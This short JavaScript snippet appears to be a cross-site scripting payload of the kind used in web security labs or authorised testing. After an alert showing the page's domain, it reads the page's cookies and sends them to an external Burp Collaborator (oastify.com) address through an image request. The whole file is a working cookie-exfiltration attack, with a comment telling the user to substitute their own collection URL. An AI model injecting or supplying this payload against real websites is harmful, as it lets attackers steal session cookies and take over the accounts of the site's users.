alert(document.domain);

// Fetch the cookies
var cookies = document.cookie;

// Send the cookies to your Burp Collaborator URL
var burpCollaboratorURL = "http://sqmts3dlekb0isi7rbbl9ksqshy8m1aq.oastify.com"; // Replace with your actual Burp Collaborator URL
var img = new Image();
img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
